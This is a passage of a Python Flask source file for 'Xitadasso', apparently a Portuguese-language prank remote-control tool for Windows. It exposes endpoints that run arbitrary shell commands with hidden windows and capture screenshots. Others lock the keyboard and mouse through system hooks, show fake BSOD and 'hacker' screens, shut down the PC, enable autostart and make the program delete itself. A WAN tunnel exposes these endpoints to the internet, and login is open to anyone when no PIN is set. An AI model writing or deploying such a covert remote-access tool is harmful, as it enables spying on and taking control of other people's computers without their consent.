for(let i=0;i<cols;i++){x.fillStyle=Math.random()<.08?'#c58cff':'#21ff5a';
x.fillText(chars[Math.floor(Math.random()*chars.length)],i*tam,gotas[i]*tam);
if(gotas[i]*tam>c.height&&Math.random()>.975)gotas[i]=0;gotas[i]++;}},45);
</script></body></html>
"""

PAGINA_HACKER = """
<!doctype html>
<html><head><meta charset="utf-8"><title> </title>
<style>html,body{margin:0;background:#000;color:#21ff5a;font:18px/1.45 Consolas,monospace;cursor:none}body{padding:18px}
pre{margin:0;white-space:pre-wrap}.fim{color:#fff;background:#c00;display:inline-block;padding:6px 14px;margin-top:14px;font-weight:700}</style>
</head><body><pre id="t"></pre>
<script>
const NL=String.fromCharCode(10);
const etapas=["Escaneando portas","Quebrando firewall","Injetando payload","Descriptografando hashes","Contornando autenticacao","Copiando arquivos","Apagando rastros"];
const t=document.getElementById('t');
function hex(n){let s='';for(let k=0;k<n;k++)s+='0123456789abcdef'[Math.floor(Math.random()*16)];return s}
let i=0;
function linha(){t.textContent+='[+] '+etapas[Math.floor(Math.random()*etapas.length)]+'... '+hex(28)+' OK'+NL;
window.scrollTo(0,document.body.scrollHeight);
if(++i<80){setTimeout(linha,40+Math.random()*160)}
else{const d=document.createElement('div');d.className='fim';d.textContent='ACESSO CONCEDIDO';document.body.appendChild(d);}}
linha();
</script></body></html>
"""


@app.route("/")
def home():
    return PAGINA


@app.route("/bsod")
def bsod():
    return PAGINA_BSOD


@app.route("/matrix")
def matrix():
    return PAGINA_MATRIX


@app.route("/hacker")
def hacker():
    return PAGINA_HACKER


@app.route("/logo.png")
def logo():
    return Response(base64.b64decode(LOGO_B64), mimetype="image/png",
                    headers={"Cache-Control": "no-cache"})


# ---------- APIs ----------

@app.route("/api/state")
def api_state():
    return jsonify(ip=ip_local(), porta=5000, pin_set=bool(ESTADO["pin"]),
                   autenticado=autenticado(), modo=ESTADO["modo"])


@app.route("/api/config", methods=["GET"])
def api_config_get():
    return jsonify(
        modo=ESTADO["modo"],
        msg_padrao=ESTADO["msg_padrao"],
        tunel_ativo=bool(TUNEL["ativo"]),
        tunel_url=TUNEL["url"],
        pin_set=bool(ESTADO["pin"]),
    )


@app.route("/api/config", methods=["POST"])
def api_config_post():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    dados = request.get_json(force=True) or {}
    if "msg_padrao" in dados:
        ESTADO["msg_padrao"] = (dados.get("msg_padrao") or "")[:200] or CONFIG_PADRAO["msg_padrao"]
    salvar_config()
    return jsonify(ok=True, msg_padrao=ESTADO["msg_padrao"])


@app.route("/api/modo", methods=["POST"])
def api_modo():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    dados = request.get_json(force=True) or {}
    modo = dados.get("modo")
    if modo not in ("lan", "wan"):
        return jsonify(erro="modo invalido"), 400

    ESTADO["modo"] = modo
    salvar_config()

    if modo == "wan":
        iniciar_tunel_async()
    else:
        parar_tunel()

    return jsonify(ok=True, modo=modo, tunel_url=TUNEL["url"], tunel_ativo=bool(TUNEL["ativo"]))


@app.route("/api/login", methods=["POST"])
def api_login():
    pin = request.get_json(force=True).get("pin", "")
    if not ESTADO["pin"] or pin == ESTADO["pin"]:
        session["ok"] = True
        return jsonify(ok=True)
    return jsonify(erro="pin incorreto"), 401


@app.route("/api/pin", methods=["POST"])
def api_pin():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    pin = (request.get_json(force=True).get("pin") or "").strip()
    ESTADO["pin"] = pin or None
    salvar_config()
    return jsonify(ok=True)


@app.route("/api/autostart", methods=["GET"])
def api_autostart_get():
    return jsonify(ativo=autostart_ativo())


@app.route("/api/autostart", methods=["POST"])
def api_autostart_post():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    dados = request.get_json(force=True) or {}
    ativo = bool(dados.get("ativo"))
    set_autostart(ativo)
    return jsonify(ok=True, ativo=autostart_ativo())


@app.route("/api/terminal_hacker", methods=["POST"])
def api_terminal_hacker():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    etapas = ["Escaneando portas", "Quebrando firewall", "Injetando payload",
              "Descriptografando hashes", "Contornando autenticacao", "Apagando rastros"]
    linhas = []
    for etapa in etapas:
        lixo = "".join(random.choices(string.hexdigits.lower(), k=32))
        linhas.append(f"[+] {etapa}... {lixo} OK")
    linhas.append("ACESSO CONCEDIDO (brincadeira, nada foi hackeado)")
    return jsonify(saida="\n".join(linhas))


@app.route("/api/abrir_abas", methods=["POST"])
def api_abrir_abas():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    dados = request.get_json(force=True)
    links = (dados.get("links") or "").split()
    if not links:
        return jsonify(erro="nenhum link informado")
    for link in links[:15]:
        if not link.startswith("http"):
            link = "https://" + link
        webbrowser.open_new_tab(link)
    return jsonify(saida=f"{len(links[:15])} aba(s) aberta(s).")


@app.route("/api/monitor_off", methods=["POST"])
def api_monitor_off():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio

    def desligar():
        time.sleep(0.5)
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)

    threading.Thread(target=desligar, daemon=True).start()
    return jsonify(saida="Monitor vai apagar em instantes. Mexa o mouse para acordar.")


@app.route("/api/desligar", methods=["POST"])
def api_desligar():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    seg = int(request.get_json(force=True).get("segundos", 30))
    executar(["shutdown", "/s", "/t", str(seg)])
    return jsonify(saida=f"PC vai desligar em {seg}s. Use 'Cancelar' para abortar.")


@app.route("/api/reiniciar", methods=["POST"])
def api_reiniciar():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    seg = int(request.get_json(force=True).get("segundos", 30))
    executar(["shutdown", "/r", "/t", str(seg)])
    return jsonify(saida=f"PC vai reiniciar em {seg}s. Use 'Cancelar' para abortar.")


@app.route("/api/cancelar", methods=["POST"])
def api_cancelar():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    executar(["shutdown", "/a"])
    return jsonify(saida="Desligamento/reinicio cancelado (se havia algum agendado).")


COMANDOS_RODANDO = {}


@app.route("/api/shell", methods=["POST"])
def api_shell():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    dados = request.get_json(force=True)
    cmd = dados.get("comando", "")
    cmd_id = dados.get("id")
    if not cmd:
        return jsonify(erro="comando vazio")
    try:
        proc = subprocess.Popen(
            cmd, shell=True, stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            encoding="cp850" if os.name == "nt" else None, errors="replace",
            creationflags=CREATE_NO_WINDOW,
        )
        if cmd_id:
            COMANDOS_RODANDO[cmd_id] = proc
        try:
            stdout, stderr = proc.communicate(timeout=60)
        finally:
            if cmd_id:
                COMANDOS_RODANDO.pop(cmd_id, None)
        saida = (stdout or "") + (stderr or "")
        if proc.returncode is not None and proc.returncode < 0:
            return jsonify(saida="(comando cancelado)")
        return jsonify(saida=saida.strip() or "(sem saida)")
    except subprocess.TimeoutExpired:
        proc.kill()
        if cmd_id:
            COMANDOS_RODANDO.pop(cmd_id, None)
        return jsonify(erro="comando demorou demais e foi cancelado")


@app.route("/api/shell_cancelar", methods=["POST"])
def api_shell_cancelar():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    cmd_id = request.get_json(force=True).get("id")
    proc = COMANDOS_RODANDO.get(cmd_id)
    if not proc:
        return jsonify(saida="nada para cancelar")
    try:
        executar(["taskkill", "/PID", str(proc.pid), "/T", "/F"], capture_output=True)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    return jsonify(saida="cancelado")


# ---------- efeitos de brincadeira ----------

ESPECIAIS_SENDKEYS = {
    "+": "{+}", "^": "{^}", "%": "{%}", "~": "{~}",
    "(": "{(}", ")": "{)}", "{": "{{}", "}": "{}}",
    "[": "{[}", "]": "{]}",
}


def gerar_script_notepad():
    linhas = ["> iniciando sequencia de acesso...", "[+] escaneando rede local...",
              "[+] contornando firewall...", "[+] acesso concedido!", "", "voce foi hackeado."]
    comandos = ["Add-Type -AssemblyName System.Windows.Forms", "Start-Sleep -Milliseconds 700"]
    for linha in linhas:
        for ch in linha:
            seguro = ESPECIAIS_SENDKEYS.get(ch, ch).replace("'", "''")
            comandos.append(f"[System.Windows.Forms.SendKeys]::SendWait('{seguro}')")
            comandos.append("Start-Sleep -Milliseconds 35")
        comandos.append("[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')")
        comandos.append("Start-Sleep -Milliseconds 150")
    return "\n".join(comandos)


@app.route("/api/digitar_notepad", methods=["POST"])
def api_digitar_notepad():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio

    def worker():
        try:
            subprocess.Popen(["notepad.exe"])
            time.sleep(1)
            caminho = os.path.join(tempfile.gettempdir(), "xitadasso_efeito.ps1")
            with open(caminho, "w", encoding="utf-8") as f:
                f.write(gerar_script_notepad())
            executar(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", caminho],
                     creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0)
        except Exception as e:
            log_seguro("erro no efeito notepad:", e)

    threading.Thread(target=worker, daemon=True).start()
    return jsonify(saida="Abrindo o Bloco de Notas e digitando sozinho...")


@app.route("/api/capslock_blink", methods=["POST"])
def api_capslock_blink():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio

    def worker():
        user32 = ctypes.windll.user32
        for _ in range(10):
            user32.keybd_event(0x14, 0, 0, 0)
            user32.keybd_event(0x14, 0, 2, 0)
            time.sleep(0.25)

    threading.Thread(target=worker, daemon=True).start()
    return jsonify(saida="Caps Lock piscando por uns segundos...")


EFEITOS_PC = {"hacker", "matrix", "bsod"}
KIOSK = {"proc": None}


def achar_navegador():
    candidatos = [
        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\Application\chrome.exe"),
    ]
    for c in candidatos:
        if os.path.exists(c):
            return c
    return None


PASTA_KIOSK = os.path.join(tempfile.gettempdir(), "xitadasso_kiosk")


def fechar_efeito():
    proc = KIOSK["proc"]
    KIOSK["proc"] = None
    if proc is not None:
        try:
            executar(["taskkill", "/PID", str(proc.pid), "/T", "/F"], capture_output=True)
        except Exception:
            pass
    try:
        executar(["wmic", "process", "where",
                  f"CommandLine like '%{PASTA_KIOSK}%'", "delete"], capture_output=True)
    except Exception:
        pass


def abrir_no_pc(caminho):
    fechar_efeito()
    url = "http://127.0.0.1:5000" + caminho
    exe = achar_navegador()
    if not exe:
        webbrowser.open(url)
        return "Abri no navegador padrao do PC (aperte F11 para tela cheia)."
    KIOSK["proc"] = subprocess.Popen(
        [exe, "--kiosk", url, "--edge-kiosk-type=fullscreen", "--user-data-dir=" + PASTA_KIOSK,
         "--no-first-run", "--disable-session-crashed-bubble"],
        stdin=subprocess.DEVNULL,
    )
    return "Efeito aberto em tela cheia no PC. Use 'Fechar efeito' (ou Alt+F4)."


@app.route("/api/efeito_pc", methods=["POST"])
def api_efeito_pc():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    nome = request.get_json(force=True).get("nome")
    if nome not in EFEITOS_PC:
        return jsonify(erro="efeito desconhecido")
    return jsonify(saida=abrir_no_pc("/" + nome))


@app.route("/api/fechar_efeito", methods=["POST"])
def api_fechar_efeito():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    fechar_efeito()
    return jsonify(saida="Efeito fechado.")


@app.route("/api/mouse_maluco", methods=["POST"])
def api_mouse_maluco():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio

    def worker():
        user32 = ctypes.windll.user32
        pt = PONTO()
        for _ in range(70):
            user32.GetCursorPos(ctypes.byref(pt))
            user32.SetCursorPos(pt.x + random.randint(-35, 35), pt.y + random.randint(-35, 35))
            time.sleep(0.1)

    threading.Thread(target=worker, daemon=True).start()
    return jsonify(saida="Mouse tremendo por uns 7 segundos...")


@app.route("/api/sirene", methods=["POST"])
def api_sirene():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio

    def worker():
        import winsound
        subida = list(range(600, 1300, 50))
        for _ in range(3):
            for f in subida + subida[::-1]:
                winsound.Beep(f, 35)

    threading.Thread(target=worker, daemon=True).start()
    return jsonify(saida="Sirene tocando...")


def texto_da_requisicao():
    texto = (request.get_json(force=True).get("texto") or "").strip()
    if not texto:
        texto = ESTADO.get("msg_padrao") or "Voce foi hackeado!"
    return texto[:200]


@app.route("/api/falar", methods=["POST"])
def api_falar():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    texto = re.sub("[\u2018\u2019\u201a\u201b']", "''", texto_da_requisicao())

    def worker():
        script = ("Add-Type -AssemblyName System.Speech;"
                  "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer;"
                  "$s.Rate = -1;"
                  f"$s.Speak('{texto}')")
        cod = base64.b64encode(script.encode("utf-16-le")).decode()
        try:
            executar(["powershell", "-NoProfile", "-EncodedCommand", cod])
        except Exception as e:
            log_seguro("erro ao falar:", e)

    threading.Thread(target=worker, daemon=True).start()
    return jsonify(saida="Falando: " + texto)


@app.route("/api/popup", methods=["POST"])
def api_popup():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    texto = texto_da_requisicao()

    def worker():
        ctypes.windll.user32.MessageBoxW(0, texto, "ALERTA DE SEGURANCA", 0x10 | 0x40000)

    threading.Thread(target=worker, daemon=True).start()
    return jsonify(saida="Pop-up aberto no PC: " + texto)


@app.route("/api/tela.jpg")
def api_tela():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    if ImageGrab is None:
        return jsonify(erro="captura de tela nao disponivel neste PC"), 500

    try:
        qualidade = max(20, min(int(request.args.get("q", 40)), 90))
    except (TypeError, ValueError):
        qualidade = 40
    try:
        largura_max = max(480, min(int(request.args.get("w", 960)), 1920))
    except (TypeError, ValueError):
        largura_max = 960
    todos = request.args.get("all") == "1"

    try:
        try:
            img = ImageGrab.grab(all_screens=todos)
        except TypeError:
            img = ImageGrab.grab()
        if img.width > largura_max:
            nova_altura = round(img.height * largura_max / img.width)
            img = img.resize((largura_max, nova_altura))
        buf = io.BytesIO()
        img.convert("RGB").save(buf, "JPEG", quality=qualidade)
        return Response(buf.getvalue(), mimetype="image/jpeg",
                        headers={"Cache-Control": "no-store"})
    except Exception as e:
        return jsonify(erro=f"falha ao capturar a tela: {e}"), 500


@app.route("/api/fechar_menu", methods=["POST"])
def api_fechar_menu():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio

    def sair():
        time.sleep(0.4)
        fechar_efeito()
        parar_tunel()
        os._exit(0)

    threading.Thread(target=sair, daemon=True).start()
    return jsonify(saida="Encerrando o Xitadasso...")


@app.route("/api/bypass", methods=["POST"])
def api_bypass():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio

    def sair():
        time.sleep(0.6)
        fechar_efeito()
        parar_tunel()
        agendar_autodelete()
        time.sleep(0.2)
        os._exit(0)

    threading.Thread(target=sair, daemon=True).start()
    return jsonify(saida="BYPASS aplicado. Xitadasso encerrando e se apagando...")


# ---------- trancar teclado e mouse ----------

TRAVA = {"ativa": False}
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int, ctypes.c_size_t, ctypes.c_ssize_t) if os.name == "nt" else None


class MSG(ctypes.Structure):
    _fields_ = [("hwnd", ctypes.c_void_p), ("message", ctypes.c_uint),
                ("wParam", ctypes.c_size_t), ("lParam", ctypes.c_ssize_t),
                ("time", ctypes.c_uint), ("px", ctypes.c_long), ("py", ctypes.c_long)]


def loop_trava(segundos):
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    user32.SetWindowsHookExW.argtypes = [ctypes.c_int, HOOKPROC, ctypes.c_void_p, ctypes.c_uint]
    user32.SetWindowsHookExW.restype = ctypes.c_void_p
    user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]
    user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_size_t, ctypes.c_ssize_t]
    user32.CallNextHookEx.restype = ctypes.c_ssize_t

    def bloquear(codigo, wparam, lparam):
        if codigo >= 0:
            return 1
        return user32.CallNextHookEx(None, codigo, wparam, lparam)

    proc = HOOKPROC(bloquear)
    h_teclado = h_mouse = None
    try:
        modulo = kernel32.GetModuleHandleW(None)
        h_teclado = user32.SetWindowsHookExW(13, proc, modulo, 0)
        h_mouse = user32.SetWindowsHookExW(14, proc, modulo, 0)
        msg = MSG()
        fim = time.time() + segundos
        while TRAVA["ativa"] and time.time() < fim:
            while user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1):
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.005)
    except Exception as e:
        log_seguro("erro na trava:", e)
    finally:
        if h_teclado:
            user32.UnhookWindowsHookEx(h_teclado)
        if h_mouse:
            user32.UnhookWindowsHookEx(h_mouse)
        TRAVA["ativa"] = False


@app.route("/api/trancar", methods=["POST"])
def api_trancar():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    if TRAVA["ativa"]:
        return jsonify(saida="Ja esta trancado. Use 'Destrancar' para liberar.")
    try:
        seg = int(request.get_json(force=True).get("segundos", 300))
    except (TypeError, ValueError):
        seg = 300
    seg = max(5, min(seg, 3600))
    TRAVA["ativa"] = True
    threading.Thread(target=loop_trava, args=(seg,), daemon=True).start()
    return jsonify(saida=f"Teclado e mouse do PC trancados por ate {seg}s.")


@app.route("/api/destrancar", methods=["POST"])
def api_destrancar():
    bloqueio = exigir_auth()
    if bloqueio:
        return bloqueio
    TRAVA["ativa"] = False
    return jsonify(saida="Teclado e mouse liberados.")


def abrir_navegador():
    time.sleep(1)
    webbrowser.open("http://127.0.0.1:5000")


# ============================================================================
# IMPORTANTE: copie a LINHA INTEIRA do seu arquivo original que comeca com
#     LOGO_B64 = "iVBORw0KGgo...
# e cole EXATAMENTE AQUI, substituindo a linha abaixo. Nao mude nem um char.
# ============================================================================
LOGO_B64 = "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